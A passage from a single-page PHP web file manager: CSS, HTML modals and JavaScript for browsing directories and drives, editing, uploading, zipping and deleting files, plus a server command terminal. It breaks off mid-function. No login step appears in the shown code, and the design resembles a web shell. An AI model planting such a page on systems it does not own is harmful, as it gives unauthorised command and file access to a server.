.item-tag.dir{background:var(--panel); color:var(--ink)}
.item-tag.file{background:var(--ink); color:var(--acid)}
.item-tag.up{background:var(--ink); color:var(--sky)}
.item-tag.zip{background:var(--violet); color:#fff}
.item-tag.drive{background:var(--ink); color:#c9f0ff}
.item-actions{display:flex; gap:.25rem; flex-shrink:0}

.ibtn{border:3px solid var(--ink); box-shadow:2px 2px 0 var(--ink);
  padding:.28rem; display:inline-flex; align-items:center; justify-content:center;
  transition:transform 50ms; background:var(--panel)}
.ibtn:hover{transform:translateY(-1px); box-shadow:3px 3px 0 var(--ink)}
.ibtn:active{transform:translate(2px,2px); box-shadow:0 0 0 var(--ink)}
.ibtn.edit{background:var(--sky); color:var(--ink)}
.ibtn.rename{background:var(--violet); color:#fff}
.ibtn.del{background:var(--coral); color:var(--ink)}
.ibtn.dl{background:var(--acid); color:var(--ink)}
.ibtn.unzip{background:#ffc9e6; color:var(--ink)}

.empty{background:var(--panel); border:var(--line); box-shadow:var(--shadow);
  padding:3rem 1rem; text-align:center; font-weight:900;
  text-transform:uppercase; letter-spacing:.05em}

.modal{position:fixed; inset:0; z-index:50; background:rgba(25,25,25,.6);
  padding:1rem; overflow-y:auto; display:none; align-items:center; justify-content:center}
.modal.open{display:flex}
.modal-box{background:var(--panel); border:var(--line); box-shadow:8px 8px 0 var(--ink);
  padding:1.1rem; width:100%; max-width:560px; margin:auto}
.modal-box.wide{max-width:900px}
.modal-head{display:flex; align-items:center; justify-content:space-between;
  gap:.6rem; padding-bottom:.7rem; margin-bottom:.8rem; border-bottom:var(--line)}
.modal-title{font-weight:900; font-size:.95rem; text-transform:uppercase; word-break:break-all;
  -webkit-user-select:text; user-select:text}
.modal-close{background:var(--coral); color:var(--ink); border:var(--line); box-shadow:var(--shadow-sm);
  padding:.25rem .5rem; font-weight:900}
.modal-close:active{transform:translate(2px,2px); box-shadow:0 0 0}
.modal input[type=text]{width:100%; border:var(--line); background:var(--paper);
  padding:.7rem; font-family:ui-monospace,monospace; font-size:.82rem}
.modal-foot{display:flex; gap:.5rem; margin-top:.8rem; flex-wrap:wrap}

.code-wrap{background:#1e1e2e; border:var(--line); overflow:auto; max-height:65vh;
  padding:.8rem; font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;
  font-size:.78rem; line-height:1.55; color:#e4e4e7;
  -webkit-touch-callout:default; -webkit-user-select:text; user-select:text}
.code-view{white-space:pre; margin:0; color:#e4e4e7;
  -webkit-user-select:text; user-select:text}

.code-editor{
  width: 100% !important;
  min-height: 400px;
  max-height: 65vh;
  padding: .8rem !important;
  border: var(--line) !important;
  background: #1e1e2e !important;
  background-color: #1e1e2e !important;
  color: #e4e4e7 !important;
  -webkit-text-fill-color: #e4e4e7 !important;
  caret-color: #f1fa8c !important;
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace !important;
  font-size: .8rem !important;
  line-height: 1.55 !important;
  tab-size: 4;
  resize: vertical;
  outline: none !important;
  color-scheme: dark;
  -webkit-appearance: none;
  appearance: none;
}

.tk-keyword{color:#ff79c6; font-weight:700}
.tk-string{color:#f1fa8c}
.tk-comment{color:#6272a4; font-style:italic}
.tk-function{color:#50fa7b}
.tk-number{color:#bd93f9}
.tk-tag{color:#ff79c6}
.tk-var{color:#8be9fd}
.tk-constant{color:#bd93f9}

.info-row{display:flex; justify-content:space-between; gap:1rem; padding:.35rem 0;
  border-bottom:1px dashed rgba(25,25,25,.2); font-size:.82rem}
.info-row:last-child{border-bottom:0}
.info-row .k{font-weight:900; opacity:.7; flex-shrink:0}
.info-row .v{font-family:ui-monospace,monospace; text-align:right; word-break:break-all;
  -webkit-user-select:text; user-select:text}

.ctx-menu{position:fixed; z-index:100; background:var(--panel); border:var(--line);
  box-shadow:var(--shadow); min-width:200px; padding:.3rem; display:none}
.ctx-menu.open{display:block}
.ctx-item{display:flex; align-items:center; gap:.6rem;
  padding:.5rem .7rem; font-weight:900; font-size:.82rem;
  cursor:pointer; border:0; background:transparent; width:100%;
  text-align:left; color:var(--ink)}
.ctx-item:hover{background:var(--acid)}
.ctx-item.danger:hover{background:var(--coral)}
.ctx-item .ic{flex-shrink:0; display:flex}
.ctx-item .kbd{margin-left:auto; font-size:.7rem; opacity:.5; font-family:ui-monospace,monospace}
.ctx-sep{border-top:2px solid var(--ink); margin:.3rem 0}

.clip-banner{position:fixed; top:0; left:0; right:0; z-index:60;
  background:var(--violet); color:#fff; border-bottom:var(--line);
  padding:.5rem .8rem; display:none; align-items:center; gap:.6rem; flex-wrap:wrap;
  font-weight:900; font-size:.8rem; text-transform:uppercase}
.clip-banner.open{display:flex}
.clip-banner .clip-info{display:flex; align-items:center; gap:.4rem; min-width:0; flex:1;
  overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
.clip-banner .clip-btns{display:flex; gap:.4rem; margin-left:auto}
.clip-banner .btn{padding:.35rem .7rem; font-size:.75rem;
  background:var(--acid); color:var(--ink); border:var(--line); box-shadow:var(--shadow-sm)}
.clip-banner .btn.cancel{background:var(--coral); color:var(--ink)}
.clip-banner .btn:hover{transform:translateY(-1px)}
.clip-banner .btn:active{transform:translate(2px,2px); box-shadow:0 0 0}

@media (max-width:640px){
  .wrap{padding:.7rem}
  .item{padding:.4rem .55rem}
  .ibtn{padding:.22rem}
  .terminal-out{font-size:.72rem; max-height:200px}
  .toolbar{gap:.4rem; padding:.4rem}
  .item-name{font-size:.75rem}
  .item-tag{font-size:.6rem}
  .code-view{font-size:.7rem}
  .code-editor{font-size:.72rem !important; min-height:300px; max-height:55vh}
}
</style>
</head>
<body>

<div class="clip-banner" id="clipBanner">
  <div class="clip-info"><span id="clipIcon"></span><span id="clipText">CLIPBOARD</span></div>
  <div class="clip-btns">
    <button class="btn" id="btnClipPaste">PASTE</button>
    <button class="btn cancel" id="btnClipCancel">CANCEL</button>
  </div>
</div>

<div class="wrap" id="mainWrap">
  <div class="pathbar">
    <span class="lbl">PATH:</span>
    <span id="curPath" style="display:flex; gap:.3rem; align-items:center"></span>
  </div>

  <div class="terminal collapsed" id="terminalEl">
    <div class="terminal-head" id="termToggle">
      <span class="title">Terminal</span>
      <span class="cwd" id="termCwd"></span>
      <button class="chev" id="termChevron" aria-label="Toggle terminal">
        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
      </button>
    </div>
    <div class="terminal-body" id="termBody">
      <div class="terminal-out" id="termOut"></div>
      <div class="terminal-input">
        <span class="ps1">&gt;</span>
        <input id="termIn" type="text" autocomplete="off" spellcheck="false" placeholder="ketik command...">
      </div>
    </div>
  </div>

  <div class="toolbar">
    <button id="btnNewFile" class="btn violet sm">
      <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 18v-6"/><path d="M9 15h6"/></svg>
      NEW FILE
    </button>
    <button id="btnUpload" class="btn sm" style="background:#b8f28b; color:var(--ink)">
      <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/></svg>
      UPLOAD
    </button>
    <input type="file" id="fileInput" multiple hidden>
    <button id="btnNewFolder" class="btn secondary sm">
      <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><path d="M12 11v6"/><path d="M9 14h6"/></svg>
      NEW FOLDER
    </button>
    <button id="btnZipMode" class="btn sm" style="background:#fff0b8; color:var(--ink)">
      <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/></svg>
      <span id="zipBtnLabel">ZIP</span>
    </button>
    <button id="btnRefresh" class="btn secondary sm">
      <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/></svg>
      RELOAD
    </button>
    <span class="spacer"></span>
    <span id="selCount" class="selinfo"></span>
  </div>

  <div id="notice" class="notice hidden"></div>
  <ul id="filelist" class="filelist"></ul>
  <div id="empty" class="empty" style="display:none">— DIRECTORY EMPTY —</div>
</div>

<div id="viewModal" class="modal">
  <div class="modal-box wide">
    <div class="modal-head"><div class="modal-title" id="viewTitle">VIEW</div><button class="modal-close" id="btnViewClose">×</button></div>
    <div class="code-wrap"><pre class="code-view" id="viewContent"></pre></div>
    <div class="modal-foot">
      <button id="btnViewEdit" class="btn violet">EDIT</button>
      <button id="btnViewCopy" class="btn outline">COPY ALL</button>
      <button id="btnViewClose2" class="btn outline">CLOSE</button>
    </div>
  </div>
</div>

<div id="editModal" class="modal">
  <div class="modal-box wide">
    <div class="modal-head"><div class="modal-title" id="editTitle">EDIT</div><button class="modal-close" id="btnEditClose">×</button></div>
    <textarea id="editContent" class="code-editor" spellcheck="false" autocorrect="off" autocapitalize="off" wrap="off"></textarea>
    <div class="modal-foot">
      <button id="btnSave" class="btn secondary">SAVE</button>
      <button id="btnCopyAll" class="btn outline">COPY ALL</button>
      <button id="btnCancel" class="btn outline">CANCEL</button>
    </div>
  </div>
</div>

<div id="infoModal" class="modal">
  <div class="modal-box">
    <div class="modal-head"><div class="modal-title">INFO</div><button class="modal-close" id="btnInfoX">×</button></div>
    <div id="infoContent"></div>
    <div class="modal-foot"><button id="btnInfoClose" class="btn outline">CLOSE</button></div>
  </div>
</div>

<div id="renameModal" class="modal">
  <div class="modal-box">
    <div class="modal-head"><div class="modal-title">RENAME</div><button class="modal-close" id="btnRenameX">×</button></div>
    <div class="mono" style="font-size:.75rem; opacity:.7; margin-bottom:.5rem; word-break:break-all" id="renameOld"></div>
    <input id="renameInput" type="text">
    <div class="modal-foot">
      <button id="btnRenameOk" class="btn violet">OK</button>
      <button id="btnRenameCancel" class="btn outline">CANCEL</button>
    </div>
  </div>
</div>

<div id="newModal" class="modal">
  <div class="modal-box">
    <div class="modal-head"><div class="modal-title" id="newTitle">NEW</div><button class="modal-close" id="btnNewX">×</button></div>
    <div class="mono" style="font-size:.75rem; opacity:.7; margin-bottom:.5rem">di: <span id="newCwd"></span></div>
    <input id="newName" type="text" placeholder="nama...">
    <div class="modal-foot">
      <button id="btnNewOk" class="btn violet">CREATE</button>
      <button id="btnNewCancel" class="btn outline">CANCEL</button>
    </div>
  </div>
</div>

<div id="delModal" class="modal">
  <div class="modal-box">
    <div class="modal-head"><div class="modal-title" style="color:var(--coral)">CONFIRM DELETE</div><button class="modal-close" id="btnDelX">×</button></div>
    <div style="margin-bottom:1rem; font-size:.9rem">Hapus <span id="delName" class="badge coral"></span> ?</div>
    <div class="modal-foot">
      <button id="btnDelOk" class="btn coral">DELETE</button>
      <button id="btnDelCancel" class="btn outline">CANCEL</button>
    </div>
  </div>
</div>

<div id="ctxMenu" class="ctx-menu">
  <button class="ctx-item" data-ctx="view"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></span>VIEW</button>
  <button class="ctx-item" data-ctx="edit"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.1 2.1 0 0 1 3 3L12 15l-4 1 1-4z"/></svg></span>EDIT</button>
  <button class="ctx-item" data-ctx="info"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></span>INFO</button>
  <button class="ctx-item" data-ctx="download"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/></svg></span>DOWNLOAD</button>
  <div class="ctx-sep"></div>
  <button class="ctx-item" data-ctx="copy"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></span>COPY<span class="kbd">CTRL+C</span></button>
  <button class="ctx-item" data-ctx="cut"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M20 4L8.12 15.88"/><path d="M14.47 14.48L20 20"/><path d="M8.12 8.12L12 12"/></svg></span>CUT<span class="kbd">CTRL+X</span></button>
  <button class="ctx-item" data-ctx="paste"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg></span>PASTE HERE<span class="kbd">CTRL+V</span></button>
  <button class="ctx-item" data-ctx="rename"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4z"/></svg></span>RENAME<span class="kbd">F2</span></button>
  <div class="ctx-sep"></div>
  <button class="ctx-item danger" data-ctx="delete"><span class="ic"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></span>DELETE<span class="kbd">DEL</span></button>
</div>

<script>
const ICON = {
  folder: '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>',
  file:   '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>',
  zip:    '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/></svg>',
  drive:  '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="12" x2="2" y2="12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/><line x1="6" y1="16" x2="6.01" y2="16"/><line x1="10" y1="16" x2="10.01" y2="16"/></svg>',
  edit:   '<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.1 2.1 0 0 1 3 3L12 15l-4 1 1-4z"/></svg>',
  rename: '<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4z"/></svg>',
  del:    '<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>',
  dl:     '<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/></svg>',
  unzip:  '<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M12 12v9"/><path d="M8 17l4 4 4-4"/></svg>',
  up:     '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>',
};

let currentPath = <?=json_encode($path)?>;
let editTarget = null, renameTarget = null, delTarget = null, newMode = null;
let viewTarget = null, viewRawContent = '';
let selected = new Set();
let zipMode = false;
let clipboard = { mode: null, sources: [] };
let ctxTarget = null;
let lastClicked = null, lastFocusedEl = null;
const $ = id => document.getElementById(id);
const editorEl = $('editContent');

async function api(action, data) {
  const body = new URLSearchParams({ action, ...data });
  const r = await fetch(window.location.pathname, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body
  });
  const text = await r.text();
  if (!text) return { ok: false, msg: 'SERVER RETURNED EMPTY' };
  try { return JSON.parse(text); }
  catch(e) { return { ok: false, msg: 'BAD RESPONSE: ' + text.slice(0, 300) }; }
}

function showNotice(msg, ok = true) {
  const n = $('notice');
  n.textContent = msg;
  n.className = 'notice ' + (ok ? 'ok' : 'err');
  clearTimeout(showNotice._t);
  showNotice._t = setTimeout(() => n.classList.add('hidden'), 4000);
}

function setFocus(row) {
  if (lastFocusedEl) lastFocusedEl.classList.remove('focused');
  if (row) { row.classList.add('focused'); lastFocusedEl = row; }
  else lastFocusedEl = null;
}

function parentPath(p) {
  if (!p) return '/';
  p = String(p).replace(/\\/g, '/').replace(/\/+$/, '');
  if (p === '' || p === '/') return '/';
  if (/^[A-Za-z]:$/.test(p)) return '/';
  const parent = p.replace(/\/[^/]+$/, '');
  if (parent === '') return '/';
  if (/^[A-Za-z]:$/.test(parent)) return parent + '/';
  return parent;
}

function renderPath(p) {
  const el = $('curPath');
  p = String(p || '/').replace(/\\/g, '/');
  const isWin = /^[A-Za-z]:/.test(p);
  const parts = p.split('/').filter(Boolean);
  let html = `<span class="crumb${parts.length ? '' : ' current'}" data-cd="/">${isWin ? 'PC' : '/'}</span>`;
  let acc = '';
  parts.forEach((seg, i) => {
    if (i === 0) acc = isWin ? seg + '/' : '/' + seg;
    else         acc += '/' + seg;
    const isLast = (i === parts.length - 1);
    html += `<span class="crumb-sep">/</span>`;
    if (isLast) html += `<span class="crumb current">${escHtml(seg)}</span>`;
    else        html += `<span class="crumb" data-cd="${escAttr(acc)}">${escHtml(seg)}</span>`;
  });
  el.innerHTML = html;
  requestAnimationFrame(() => { const w = el.parentElement; if (w) w.scrollLeft = w.scrollWidth; });
  termUpdateCwd();
}

function updateSelCount() {
  const n = selected.size;
  $('selCount').textContent = n > 0 ? n + ' selected' : '';
  $('zipBtnLabel').textContent = zipMode ? (n > 0 ? 'ZIP (' + n + ')' : 'CANCEL') : 'ZIP';
}

function renderList(entries) {
  const list = $('filelist');
  const empty = $('empty');

  let upItem = '';
  const parent = parentPath(currentPath);
  if (parent && parent !== currentPath) {
    upItem = `
      <li class="item up" data-row="1" data-path="${escAttr(parent)}" data-name=".." data-dir="1">
        <div class="item-left">
          <div class="item-check"></div>
          <span class="item-icon">${ICON.up}</span>
          <span class="item-name" data-act="up">../</span>
          <span class="item-tag up">UP</span>
        </div>
      </li>`;
  }

  if (!entries.length && !upItem) {
    list.innerHTML = ''; empty.style.display = 'block'; return;
  }
  empty.style.display = 'none';

  const itemsHtml = entries.map(e => {
    const isDrive = !!e.drive;
    const isDir = e.dir && !isDrive;
    const isZip = !e.dir && /\.(zip|tar|gz|tgz|tar\.gz)$/i.test(e.name);
    const safeName = escHtml(e.name);
    const safePath = escAttr(e.path);
    const sizeStr = e.dir ? '' : `<span class="item-size">${humanSize(e.size)}</span>`;
    const isSelected = selected.has(e.path);

    let cls = '';
    if (isDrive) cls = 'drive';
    else if (isDir) cls = 'dir';
    if (isZip) cls = 'zip';
    if (isSelected) cls += ' selected';

    let tagCls = 'file', tagTxt = 'FILE';
    if (isDrive) { tagCls = 'drive'; tagTxt = 'DRIVE'; }
    else if (isDir) { tagCls = 'dir'; tagTxt = 'DIR'; }
    if (isZip) { tagCls = 'zip'; tagTxt = 'ZIP'; }

    let icon = ICON.file;
    if (isDrive) icon = ICON.drive;
    else if (isDir) icon = ICON.folder;
    else if (isZip) icon = ICON.zip;

    let btns = '';
    if (!isDrive) {
      if (isDir) {
        btns += `<button data-act="rename" data-path="${safePath}" data-name="${escAttr(e.name)}" class="ibtn rename" title="Rename (F2)">${ICON.rename}</button>`;
        btns += `<button data-act="delete" data-path="${safePath}" data-name="${escAttr(e.name)}" data-dir="1" class="ibtn del" title="Delete (Del)">${ICON.del}</button>`;
      } else {
        btns += `<button data-act="edit" data-path="${safePath}" class="ibtn edit" title="Edit">${ICON.edit}</button>`;
        btns += `<button data-act="download" data-path="${safePath}" class="ibtn dl" title="Download">${ICON.dl}</button>`;
        if (isZip) btns += `<button data-act="unzip" data-path="${safePath}" class="ibtn unzip" title="Unzip">${ICON.unzip}</button>`;
        btns += `<button data-act="rename" data-path="${safePath}" data-name="${escAttr(e.name)}" class="ibtn rename" title="Rename (F2)">${ICON.rename}</button>`;
        btns += `<button data-act="delete" data-path="${safePath}" data-name="${escAttr(e.name)}" data-dir="0" class="ibtn del" title="Delete (Del)">${ICON.del}</button>`;
      }
    }

    return `
    <li class="item ${cls}" data-row="1" data-path="${safePath}" data-name="${escAttr(e.name)}" data-dir="${e.dir ? 1 : 0}" data-drive="${isDrive ? 1 : 0}">
      <div class="item-left">
        <div class="item-check ${isSelected ? 'checked' : ''}" data-check="${safePath}"></div>
        <span class="item-icon">${icon}</span>
        <span class="item-name" data-act="${e.dir ? 'cd' : 'view'}" data-path="${safePath}">${safeName}</span>
        ${sizeStr}
        <span class="item-tag ${tagCls}">${tagTxt}</span>
      </div>
      <div class="item-actions">${btns}</div>
    </li>`;
  }).join('');

  list.innerHTML = upItem + itemsHtml;
  updateSelCount();
  attachLongPress();
}

async function loadDir(p, fromPop = false) {
  const res = await api('list', { path: p });
  if (!res.ok) { showNotice(res.msg || 'LOAD FAILED', false); return; }
  currentPath = res.path;
  selected.clear();
  if (zipMode) setZipMode(false);
  lastClicked = null;
  setFocus(null);
  renderPath(currentPath);
  renderList(res.entries);
  if (!fromPop) history.pushState({ path: currentPath }, '', '?path=' + encodeURIComponent(currentPath));
}

window.addEventListener('popstate', e => {
  const p = (e.state && e.state.path) || new URLSearchParams(location.search).get('path') || currentPath;
  if (p && p !== currentPath) loadDir(p, true);
});

function setZipMode(on) {
  zipMode = on;
  document.body.classList.toggle('zip-mode', on);
  if (!on) selected.clear();
  document.querySelectorAll('.item-check').forEach(c => { c.style.display = on ? 'flex' : 'none'; });
  updateSelCount();
}

// VIEW / EDIT / SAVE
async function openView(p) {
  const res = await api('read', { file: p });
  if (!res.ok) { showNotice(res.msg || 'READ FAILED', false); return; }
  viewTarget = p;
  viewRawContent = res.content || '';
  $('viewTitle').textContent = 'VIEW: ' + p;
  $('viewContent').innerHTML = highlight(viewRawContent);
  $('viewModal').classList.add('open');
}
function closeView() { $('viewModal').classList.remove('open'); viewTarget = null; viewRawContent = ''; }

async function openEdit(p) {
  const res = await api('read', { file: p });
  if (!res.ok) { showNotice(res.msg || 'READ FAILED', false); return; }
  editTarget = p;
  $('editTitle').textContent = 'EDIT: ' + p;
  editorEl.value = res.content || '';
  $('editModal').classList.add('open');
  setTimeout(() => { editorEl.focus(); editorEl.setSelectionRange(0, 0); }, 50);
}
function closeEdit() { $('editModal').classList.remove('open'); editTarget = null; }
async function saveEdit() {
  if (!editTarget) return;
  const res = await api('save', { file: editTarget, content: editorEl.value });
  showNotice(res.msg, res.ok);
  if (res.ok) { closeEdit(); loadDir(currentPath, true); }
}

async function openInfo(p) {
  const res = await api('info', { target: p });
  if (!res.ok) { showNotice(res.msg || 'INFO FAILED', false); return; }
  const i = res.info;
  const rows = [
    ['Name', i.name], ['Path', i.path], ['Type', i.type],
    ['Size', typeof i.size === 'number' ? humanSize(i.size) + ' (' + i.size + ' B)' : i.size],
    ['Ext', i.ext], ['Perm', i.perm],
    ['Owner', i.owner], ['Group', i.group],
    ['Readable', i.readable], ['Writable', i.writable],
    ['Modified', i.mtime], ['Accessed', i.atime], ['Changed', i.ctime],
  ];
  $('infoContent').innerHTML = rows.map(([k, v]) =>
    `<div class="info-row"><span class="k">${escHtml(k)}</span><span class="v">${escHtml(String(v))}</span></div>`
  ).join('');
  $('infoModal').classList.add('open');
}
function closeInfo() { $('infoModal').classList.remove('open'); }

function openRename(p, name) {
  renameTarget = p; $('renameOld').textContent = p; $('renameInput').value = name;
  $('renameModal').classList.add('open');
  setTimeout(() => { $('renameInput').focus(); $('renameInput').select(); }, 50);
}
function closeRename() { $('renameModal').classList.remove('open'); renameTarget = null; }
async function doRename() {
  const newName = $('renameInput').value.trim();
  if (!newName) return;
  const res = await api('rename', { oldname: renameTarget, newname: newName });
  showNotice(res.msg, res.ok);
  if (res.ok) { closeRename(); loadDir(currentPath, true); }
}

function openNew(mode) {
  newMode = mode;
  $('newTitle').textContent = mode === 'file' ? 'NEW FILE' : 'NEW FOLDER';
  $('newCwd').textContent = currentPath;
  $('newName').value = '';
  $('newModal').classList.add('open');
  setTimeout(() => $('newName').focus(), 50);
}
function closeNew() { $('newModal').classList.remove('open'); newMode = null; }
async function doNew() {
  const name = $('newName').value.trim();
  if (!name) return;
  const action = newMode === 'file' ? 'newfile' : 'newfolder';
  const res = await api(action, { name });
  showNotice(res.msg, res.ok);
  if (res.ok) { closeNew(); loadDir(currentPath, true); }
}

async function doUpload(files) {
  if (!files || !files.length) return;
  const fd = new FormData();
  fd.append('action', 'upload');
  for (const f of files) fd.append('files[]', f);
  try {
    const r = await fetch(window.location.pathname, { method: 'POST', body: fd });
    const text = await r.text();
    let res;
    if (!text) res = { ok: false, msg: 'EMPTY RESPONSE' };
    else { try { res = JSON.parse(text); } catch(e) { res = { ok: false, msg: 'BAD RESPONSE' }; } }
    showNotice(res.msg, res.ok);
    if (res.ok) loadDir(currentPath, true);
  } catch(e) { showNotice('UPLOAD NET ERR: ' + e.message, false); }
}

function openDelete(p, name, isDir) {
  delTarget = p;
  if (selected.size > 0) $('delName').textContent = selected.size + ' item(s)';
  else $('delName').textContent = name + (isDir ? ' [DIR]' : '');
  $('delModal').classList.add('open');
}
function closeDelete() { $('delModal').classList.remove('open'); delTarget = null; }
async function doDelete() {
  const targets = selected.size > 0 ? Array.from(selected) : [delTarget];
  const form = new URLSearchParams();
  form.append('action', 'delete');
  targets.forEach(t => form.append('targets[]', t));
  const r = await fetch(window.location.pathname, {
